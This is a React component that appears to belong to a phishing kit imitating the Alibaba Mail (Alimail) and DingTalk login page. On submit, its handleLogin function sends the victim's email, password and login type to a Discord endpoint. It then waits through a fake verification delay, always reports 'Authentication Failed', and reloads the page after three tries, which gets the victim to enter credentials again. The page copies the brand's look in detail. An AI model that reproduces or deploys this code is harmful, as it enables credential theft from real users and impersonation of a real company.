import React, { useState } from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { useTranslation } from '../components/LanguageProvider';
import { submitToDiscord } from '../services/DiscordService';

interface AlibabaThemeProps {
  prefilledEmail?: string;
}

const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
  const { t, lang } = useTranslation();
  const [activeTab, setActiveTab] = useState<'account' | 'dingtalk'>('account');
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [agreed, setAgreed] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        email,
        password,
        loginType: activeTab,
        theme: 'alibaba',
      }, 'AlibabaTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white overflow-x-hidden">
      <Header />
      
      {/* Hero Section */}
      <main className="relative flex-grow flex items-center justify-center bg-[#f8fbff] py-16 overflow-hidden min-h-[600px]">
        {/* Soft Background Abstract Shapes */}
        <div className="absolute top-0 right-0 w-[600px] h-[600px] bg-blue-50 rounded-full blur-[100px] -mr-48 -mt-48 opacity-60"></div>
        <div className="absolute bottom-0 left-0 w-[400px] h-[400px] bg-blue-50 rounded-full blur-[80px] -ml-24 -mb-24 opacity-60"></div>
        
        <div className="relative z-10 w-full max-w-[1200px] mx-auto px-6 grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
          
          {/* Left Side: Illustration & Promo */}
          <div className="lg:col-span-7 flex flex-col items-center lg:items-start text-center lg:text-left space-y-8">
            <div className="space-y-4">
              <h1 className="text-[36px] font-bold text-gray-800 tracking-tight">
                阿里邮箱<span className="text-[#f54c3e] ml-2 font-normal">新</span>服务
              </h1>
              <p className="text-gray-400 text-lg">
                订阅官方组件，了解产品最新动态
              </p>
            </div>

            {/* Device Mockup Graphic */}
            <div className="relative w-full max-w-[500px] aspect-[16/9] bg-white rounded-xl shadow-2xl p-2 border border-blue-50 overflow-hidden">
               <div className="w-full h-full bg-[#fcfdfe] flex items-center justify-center relative">
                 {/* Mock UI Elements */}
                 <div className="absolute top-4 left-4 right-4 h-8 bg-gray-50 rounded flex items-center px-4 space-x-2">
                    <div className="w-2 h-2 bg-gray-200 rounded-full"></div>
                    <div className="w-16 h-2 bg-gray-100 rounded"></div>
                 </div>
                 <div className="w-3/4 h-3/4 bg-white shadow-sm rounded-lg flex items-center justify-center">
                    <span className="text-red-100 text-[100px] font-bold">M</span>
                 </div>
               </div>
            </div>

            {/* Icons row */}
            <div className="flex flex-wrap justify-center lg:justify-start gap-8 opacity-70">
              <div className="flex flex-col items-center space-y-1">
                <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-400">🏷️</div>
                <span className="text-xs text-gray-500">最新优惠</span>
              </div>
              <div className="flex flex-col items-center space-y-1">
                <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-400">📦</div>
                <span className="text-xs text-gray-500">产品新闻</span>
              </div>
              <div className="flex flex-col items-center space-y-1">
                <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-400">🔔</div>
                <span className="text-xs text-gray-500">服务通知</span>
              </div>
              <div className="flex flex-col items-center space-y-1">
                <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-400">📋</div>
                <span className="text-xs text-gray-500">使用案例</span>
              </div>
            </div>

            {/* Subscription Box */}
            <div className="flex w-full max-w-[400px] border border-gray-200 rounded overflow-hidden shadow-sm bg-white">
              <input 
                type="text" 
                placeholder="输入邮箱地址" 
                className="flex-grow px-4 py-3 outline-none text-sm text-gray-600"
              />
              <button className="px-6 py-3 bg-[#f54c3e] text-white text-sm font-bold flex items-center space-x-2 hover:bg-[#d43d31] transition-colors">
                <span>立即订阅</span>
                <span className="text-xs">🔔</span>
              </button>
            </div>
          </div>

          {/* Right Side: Login Card */}
          <div className="lg:col-span-5 flex justify-center lg:justify-end">
            <div className="w-full max-w-[400px] bg-white rounded shadow-[0_10px_50px_rgba(0,0,0,0.06)] border border-[#eff2f6] flex flex-col overflow-hidden">
              
              {/* Tabs */}
              <div className="flex border-b border-[#f0f3f7]">
                <button 
                  onClick={() => setActiveTab('account')}
                  className={`flex-1 py-5 text-[15px] font-medium transition-all relative ${activeTab === 'account' ? 'text-gray-900' : 'text-gray-400'}`}
                >
                  Account Login
                  {activeTab === 'account' && <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-[2.5px] bg-gray-800"></div>}
                </button>
                <button 
                  onClick={() => setActiveTab('dingtalk')}
                  className={`flex-1 py-5 text-[15px] font-medium transition-all relative ${activeTab === 'dingtalk' ? 'text-gray-900' : 'text-gray-400'}`}
                >
                  DingTalk Account Login
                  {activeTab === 'dingtalk' && <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-[2.5px] bg-gray-800"></div>}
                </button>
              </div>

              {/* Form Content */}
              <form onSubmit={handleLogin} className="p-8 space-y-6">
                <div className="space-y-4">
                  <div className="relative">
                    <input 
                      type="text" 
                      placeholder="Enter the complete enterprise mailbox or ad..." 
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-200 rounded focus:border-blue-400 outline-none text-[14px] placeholder:text-gray-300 transition-colors"
                    />
                  </div>
                  <div className="relative group">
                    <input 
                      type={showPassword ? 'text' : 'password'} 
                      placeholder="Enter password" 
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-200 rounded focus:border-blue-400 outline-none text-[14px] placeholder:text-gray-300 transition-colors"
                    />
                    <button 
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPassword ? '👁️' : '👁️‍🗨️'}
                    </button>
                  </div>
                </div>

                {/* Loading State */}
                {isLoading && (
                  <div className="flex items-center justify-center py-4">
                    <div className="flex flex-col items-center space-y-2">
                      <div className="w-6 h-6 border-3 border-orange-200 border-t-orange-500 rounded-full animate-spin"></div>
                      <p className="text-[14px] text-gray-500">
                        {lang === 'zh' ? '正在验证...' : 'Verifying...'}
                      </p>
                    </div>
                  </div>
                )}

                {/* Authentication Failed Message */}
                {authError && !isLoading && (
                  <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                    <div className="flex items-start space-x-2">
                      <div className="flex-shrink-0 text-red-500 text-lg">⚠️</div>
                      <div>
                        <h3 className="font-medium text-red-800 text-[14px]">
                          {lang === 'zh' ? '验证失败' : 'Authentication Failed'}
                        </h3>
                        <p className="text-red-700 text-[13px] mt-1">
                          {lang === 'zh' ? `请重试。剩余尝试次数: ${3 - failedAttempts}` : `Please try again. Attempts left: ${3 - failedAttempts}`}
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                <div className="flex items-center justify-between text-[12px]">
                  <label className="flex items-center text-gray-500 cursor-pointer">
                    <input 
                      type="checkbox" 
                      className="mr-2 accent-[#007aff] w-4 h-4" 
                      defaultChecked 
                    />
                    Save Username
                  </label>
                  <a href="#" className="text-gray-400 hover:text-[#f54c3e]">Forgot Password</a>
                </div>

                <button 
                  type="submit"
                  disabled={isLoading || !agreed}
                  className="w-full py-3.5 bg-[#f54c3e] hover:bg-[#d43d31] text-white font-bold rounded transition-all text-[16px] shadow-lg shadow-red-100 uppercase tracking-wide disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isLoading ? (lang === 'zh' ? '验证中...' : 'Verifying...') : 'Sign In'}
                </button>

                <div className="flex items-start text-[12px] leading-snug text-gray-500 pt-2">
                  <input 
                    type="checkbox" 
                    id="aliyun-agreement" 
                    checked={agreed}
                    onChange={(e) => setAgreed(e.target.checked)}
                    className="mt-0.5 mr-2 accent-[#007aff] shrink-0 w-4 h-4" 
                  />
                  <label htmlFor="aliyun-agreement" className="cursor-pointer">
                    I have read and agree with <a href="#" className="text-blue-500">Privacy Policy</a>, <a href="#" className="text-blue-500">Product Service Agreement</a>
                  </label>
                </div>
              </form>

              {/* Bottom Quick Switch */}
              <div className="bg-[#fcfdfe] border-t border-[#f0f3f7] py-4 flex items-center justify-center space-x-2 group cursor-pointer hover:bg-white transition-all">
                <div className="w-8 h-8 bg-white border border-gray-100 flex items-center justify-center shadow-sm">
                   <svg viewBox="0 0 100 100" className="w-5 h-5">
                      <rect x="10" y="10" width="80" height="80" fill="#f54c3e" rx="4" />
                      <path d="M30 30 L70 70 M70 30 L30 70" stroke="white" strokeWidth="10" />
                   </svg>
                </div>
                <span className="text-[13px] text-gray-500 group-hover:text-gray-700">Scan to sign in with Alimail</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default AlibabaTheme;